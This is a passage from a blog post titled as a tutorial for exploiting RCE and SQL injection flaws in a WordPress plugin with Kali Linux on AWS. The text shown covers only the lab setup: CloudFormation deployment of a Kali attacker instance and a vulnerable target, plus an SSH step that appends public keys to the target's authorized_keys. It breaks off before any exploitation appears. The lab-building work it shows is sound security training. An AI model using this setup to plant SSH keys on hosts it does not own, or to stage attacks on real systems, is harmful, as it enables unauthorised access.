<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Exploit vulnerability in a WordPress plugin with Kali Linux 2" /><meta name="author" content="Petr Ruzicka" /><meta property="og:locale" content="en" /><meta name="description" content="Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux" /><meta property="og:description" content="Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux" /><link rel="canonical" href="https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/" /><meta property="og:url" content="https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/" /><meta property="og:site_name" content="Petr’s Blog" /><meta property="og:image" content="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-05-09T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" /><meta property="twitter:title" content="Exploit vulnerability in a WordPress plugin with Kali Linux 2" /><meta name="twitter:site" content="@Ruzicka_Petr" /><meta name="twitter:creator" content="@Ruzicka_Petr" /><meta name="google-site-verification" content="4ugGShJoiB9veoPwFcMsMjzk-1BYbi5ozcSnovkBWtA" /><meta name="msvalidate.01" content="592AB158E3F9EF887F8DC8E69A2FF754" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Petr Ruzicka","url":"https://petr.ruzicka.dev"},"dateModified":"2025-06-03T21:56:36+02:00","datePublished":"2024-05-09T00:00:00+02:00","description":"Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux","headline":"Exploit vulnerability in a WordPress plugin with Kali Linux 2","image":"https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/"},"url":"https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/"}</script><title>Exploit vulnerability in a WordPress plugin with Kali Linux 2 | Petr's Blog</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> document.addEventListener('DOMContentLoaded', () => { const pv = document.getElementById('pageviews'); if (pv !== null) { const uri = location.pathname.replace(/\/$/, ''); const url = `https://ruzickap-github-io.goatcounter.com/counter/${encodeURIComponent(uri)}.json`; fetch(url) .then((response) => response.json()) .then((data) => { const count = data.count.replace(/\D/g, ''); pv.innerText = new Intl.NumberFormat().format(count); }) .catch((error) => { pv.innerText = '1'; }); } }); </script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-64WRCWDZM8"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-64WRCWDZM8'); }); </script> <script async src="https://gc.zgo.at/count.js" data-goatcounter="https://ruzickap-github-io.goatcounter.com/count" ></script> <script defer src="https://cloud.umami.is/script.js" data-website-id="380ea41a-7d5f-4423-8e13-03151bde195f" ></script> <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "3ppVAbe7E50OYFNqyhCNM1wmS_uQ1FrH5PHYn9d-"}' ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="https://0.gravatar.com/avatar/5484c0fd9f98e2ffd9212b158931bf4b?s=200" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Petr's Blog</a><p class="site-subtitle fst-italic mb-0">DevOps • GitOps • K8s</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-project-diagram"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/ruzickap" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['petr.ruzicka','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/petrruzicka/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://petr.ruzicka.dev" aria-label="homepage" target="_blank" rel="noopener noreferrer" > <i class="fas fa-home"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Exploit vulnerability in a WordPress plugin with Kali Linux 2</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Exploit vulnerability in a WordPress plugin with Kali Linux 2</h1><p class="post-desc fw-light mb-4">Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1715205600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 9, 2024 </time> </span> <span> Updated <time data-ts="1748980596" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jun 3, 2025 </time> </span><div class="mt-3 mb-3"> <a href="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" class="popup img-link preview-img shimmer"><img src="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://petr.ruzicka.dev">Petr Ruzicka</a> </em> </span><div> <span> <em id="pageviews"> <i class="fas fa-spinner fa-spin small"></i> </em> views </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="3224 words" > <em>17 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Exploit vulnerability in a WordPress plugin with Kali Linux 2</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Exploit vulnerability in a WordPress plugin with Kali Linux 2</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>For educational purposes, it can be useful to learn how to exploit Remote Code Execution (RCE) and SQL Injection (SQLi) vulnerabilities in a WordPress plugin using Kali Linux.</p><p>I will cover the following steps:</p><ul><li>Install an Amazon ECS cluster and create two EC2 instances (one standalone and one with Docker)<li>Install WordPress and a vulnerable WordPress plugin to ECS, Docker, and a standalone EC2 instance<li>Create an EC2 instance with Kali Linux (and install Metasploit on it) to serve as the attacker machine<li>Exploit vulnerabilities in a WordPress plugin using Kali Linux and Metasploit</ul><h2 id="set-necessary-environment-variables-and-download-cloudformation-templates"><span class="me-2">Set necessary environment variables and download CloudFormation templates</span><a href="#set-necessary-environment-variables-and-download-cloudformation-templates" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Requirements:</p><ul><li><a href="https://aws.amazon.com/cli/">AWS CLI</a><li><a href="https://github.com/abiosoft/colima">Colima</a> / <a href="https://www.docker.com/">Docker</a> / <a href="https://rancherdesktop.io/">Rancher Desktop</a> / …<li><a href="https://github.com/aws/copilot-cli">copilot</a></ul><p>Set the required environment variables:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">"xxxxxxxxxxxxxxxxxx"</span>
<span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_REGION</span><span class="o">=</span><span class="s2">"eu-central-1"</span>
<span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="o">=</span><span class="s2">"wordpress-test"</span>
<span class="nv">TMP_DIR</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">:-${</span><span class="nv">PWD</span><span class="k">}}</span><span class="s2">"</span>
<span class="nv">WORDPRESS_USERNAME</span><span class="o">=</span><span class="s2">"wordpress"</span>
<span class="nv">WORDPRESS_PASSWORD</span><span class="o">=</span><span class="si">$(</span>openssl rand <span class="nt">-base64</span> 12<span class="si">)</span>
<span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="o">=</span><span class="s2">"wordpress"</span>
<span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="o">=</span><span class="s2">"wordpress"</span>
<span class="nv">MARIADB_WORDPRESS_DATABASE_PASSWORD</span><span class="o">=</span><span class="si">$(</span>openssl rand <span class="nt">-base64</span> 12<span class="si">)</span>
<span class="nv">MARIADB_ROOT_PASSWORD</span><span class="o">=</span><span class="si">$(</span>openssl rand <span class="nt">-base64</span> 12<span class="si">)</span>
</pre></table></code></div></div><p>Download the CloudFormation templates for the <a href="https://github.com/aws-samples/aws-codebuild-samples/blob/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml">VPC</a>, <a href="https://github.com/aws-samples/amazon-ec2-nice-dcv-samples/blob/16b1251185f1f91764c1bb1c7e79d6595e7d36ce/cfn/KaliLinux-NICE-DCV.yaml">Kali Linux</a>, <a href="https://github.com/aws-samples/ec2-lamp-server/blob/c2b64d97229a223dd5f5f38fd3f9660a8011f050/UbuntuLinux-2204-LAMP-server.yaml">Ubuntu (Docker EC2)</a>, and <a href="https://github.com/aws-samples/ec2-lamp-server/blob/c2b64d97229a223dd5f5f38fd3f9660a8011f050/AmazonLinux-2023-LAMP-server.yaml">AmazonLinux-2023 (standalone EC2)</a> instances:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c"># renovate: currentValue=master</span>
wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml
<span class="c"># renovate:</span>
wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/3cb54467cf4c58bace2f949a704871f9bc0e5af5/cfn/KaliLinux-NICE-DCV.yaml
<span class="c"># renovate:</span>
wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/UbuntuLinux-2204-LAMP-server.yaml
<span class="c"># renovate:</span>
wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/AmazonLinux-2023-LAMP-server.yaml
</pre></table></code></div></div><p>Create a new AWS EC2 Key Pair to be used for the EC2 instances:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>aws ec2 create-key-pair <span class="nt">--key-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--key-type</span> ed25519 <span class="nt">--query</span> <span class="s2">"KeyMaterial"</span> <span class="nt">--output</span> text <span class="o">&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span>
<span class="nb">chmod </span>600 <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span>
</pre></table></code></div></div><h2 id="run-kali-linux-on-amazon-ec2-instance"><span class="me-2">Run Kali Linux on Amazon EC2 instance</span><a href="#run-kali-linux-on-amazon-ec2-instance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" class="popup img-link shimmer"><img src="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" alt="Kali Linux" width="600" loading="lazy"></a></p><p>Create an AWS EC2 instance with <a href="https://www.kali.org/">Kali Linux</a> using the CloudFormation template:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">SOLUTION_KALI</span><span class="o">=</span><span class="s2">"KaliLinux-NICE-DCV"</span>

aws cloudformation deploy <span class="nt">--capabilities</span> CAPABILITY_IAM <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"EnvironmentName=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/vpc_cloudformation_template.yml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="o">=</span><span class="si">$(</span>aws cloudformation describe-stacks <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--query</span> <span class="s2">"Stacks[0].Outputs[? OutputKey==</span><span class="se">\`</span><span class="s2">PublicSubnet1</span><span class="se">\`</span><span class="s2"> || OutputKey==</span><span class="se">\`</span><span class="s2">VPC</span><span class="se">\`</span><span class="s2">].{OutputKey:OutputKey,OutputValue:OutputValue}"</span><span class="si">)</span>
<span class="nv">AWS_VPC_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">VPC</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>
<span class="nv">AWS_SUBNET_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">PublicSubnet1</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>

<span class="nb">eval </span>aws cloudformation create-stack <span class="nt">--capabilities</span> CAPABILITY_AUTO_EXPAND CAPABILITY_IAM <span class="nt">--on-failure</span> DO_NOTHING <span class="se">\</span>
  <span class="nt">--parameters</span> <span class="s2">"ParameterKey=ec2KeyPair,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2"> ParameterKey=vpcID,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_VPC_ID</span><span class="k">}</span><span class="s2"> ParameterKey=subnetID,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_SUBNET_ID</span><span class="k">}</span><span class="s2"> ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--template-body</span> <span class="s2">"file://</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/KaliLinux-NICE-DCV.yaml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Key=Owner,Value=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Key=Environment,Value=dev Key=Solution,Value=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><h2 id="build-ec2-instances-with-wordpress-application"><span class="me-2">Build EC2 instances with Wordpress Application</span><a href="#build-ec2-instances-with-wordpress-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s look at how to build an EC2 instance with a vulnerable WordPress application.</p><h3 id="create-new-ec2-instance-with-wordpress-in-container"><span class="me-2">Create new EC2 instance with Wordpress in Container</span><a href="#create-new-ec2-instance-with-wordpress-in-container" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Build a new Ubuntu Linux 22.04 EC2 instance:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="o">=</span><span class="s2">"Amazon-EC2-Container"</span>

aws cloudformation deploy <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"EnvironmentName=</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/vpc_cloudformation_template.yml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="o">=</span><span class="si">$(</span>aws cloudformation describe-stacks <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--query</span> <span class="s2">"Stacks[0].Outputs[? OutputKey==</span><span class="se">\`</span><span class="s2">PublicSubnet1</span><span class="se">\`</span><span class="s2"> || OutputKey==</span><span class="se">\`</span><span class="s2">VPC</span><span class="se">\`</span><span class="s2">].{OutputKey:OutputKey,OutputValue:OutputValue}"</span><span class="si">)</span>
<span class="nv">AWS_VPC_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">VPC</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>
<span class="nv">AWS_SUBNET_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">PublicSubnet1</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>

<span class="nb">eval </span>aws cloudformation deploy <span class="nt">--capabilities</span> CAPABILITY_IAM <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"instanceType=t4g.medium ec2Name=</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2"> ec2KeyPair=</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2"> vpcID=</span><span class="k">${</span><span class="nv">AWS_VPC_ID</span><span class="k">}</span><span class="s2"> subnetID=</span><span class="k">${</span><span class="nv">AWS_SUBNET_ID</span><span class="k">}</span><span class="s2"> webOption=none databaseOption=none phpVersion=none"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/AmazonLinux-2023-LAMP-server.yaml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="o">=</span><span class="si">$(</span>aws ec2 describe-instances <span class="nt">--filters</span> <span class="s2">"Name=tag:Solution,Values=</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s2">"Reservations[].Instances[].PublicIpAddress"</span> <span class="nt">--output</span> text<span class="si">)</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys'</span>
</pre></table></code></div></div><p>Install Docker and <a href="https://docs.docker.com/compose/">Docker Compose</a> on the instance:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
